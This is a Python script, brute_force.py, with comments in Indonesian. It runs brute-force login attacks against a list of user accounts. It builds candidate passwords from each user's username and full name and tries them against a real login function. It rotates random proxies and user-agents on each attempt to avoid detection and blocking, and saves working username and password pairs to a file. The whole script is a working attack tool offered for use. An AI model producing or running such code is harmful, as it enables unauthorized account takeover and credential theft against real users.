# brute_force.py

import argparse
import json
import random
from utils.tools import login_real, load_list_from_file
from utils.password_gen import generate_passwords
from colorama import Fore

def load_user_list(path):
    with open(path, 'r') as f:
        return json.load(f)

def brute_force_real_mode(user_list):
    proxies = load_list_from_file("Proxy.txt")
    user_agents = load_list_from_file("User-agents.txt")

    for user in user_list:
        username = user['username']
        full_name = user.get('full_name', '')
        passwords = generate_passwords(username, full_name)

        print(Fore.CYAN + f"\n🚀 Mencoba login untuk: {username} ({len(passwords)} kombinasi)")

        for pwd in passwords:
            proxy = random.choice(proxies) if proxies else None
            ua = random.choice(user_agents) if user_agents else None

            success = login_real(username, pwd, user_agent=ua, proxy=proxy)
            if success:
                with open("hasil_login_berhasil.txt", "a") as f:
                    f.write(f"{username}|{pwd}\n")
                break  # stop setelah berhasil login
            else:
                continue

def brute_force_simulasi_mode(user_list):
    for user in user_list:
        username = user['username']
        print(Fore.CYAN + f"🔧 Simulasi login: {username} (mode simulasi)")
        # Simulasi login testing di sini jika ingin
        pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--file", help="Path ke file JSON user list", required=True)
    parser.add_argument("--mode", help="Mode: real / simulasi", choices=["real", "simulasi"], default="simulasi")

    args = parser.parse_args()
    user_list = load_user_list(args.file)

    if args.mode == "real":
        brute_force_real_mode(user_list)
    else:
        brute_force_simulasi_mode(user_list)
